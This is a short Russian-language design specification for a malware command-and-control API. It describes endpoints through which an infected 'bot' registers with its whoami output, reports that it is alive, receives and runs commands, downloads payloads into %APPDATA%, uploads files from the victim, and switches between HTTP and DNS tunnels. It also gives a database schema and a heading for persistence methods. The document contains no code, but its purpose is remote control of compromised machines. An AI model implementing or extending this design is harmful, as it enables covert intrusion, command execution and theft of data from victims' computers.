Документация

#Api

* /api/v1/register?whoami={{whoami output}}&uid=
> Когда бот приходит в первый раз он регистрируется, при этом шлет информацию whoami и рандомно сгенерированный uid

* /api/v1/get_command?token=
> Если idle вернет execute_command, то бот идет получает команду
* /api/v1/idle?token=
> Idle чекает то, что наш бот ещё жив (alive)
* /api/v1/download?token=
> Если idle вернет download, то бот идет на download, качает и дропает в %APPDATA%
* /api/v1/upload?token=
> Если idle вернет upload, то бот идет на upload и отдает файл
* /api/v1/output_command?token=
> Сюда бот возвращает результат команды, которую он получил в get_command
* /api/v1/change_tunnel?token=&tunnel=
> Возомжность менять HTTP/DNS туннель

#Database
uid | whoami | command | time | alive |  tunnel |
------------ |

#Frontend
Способы закрепления
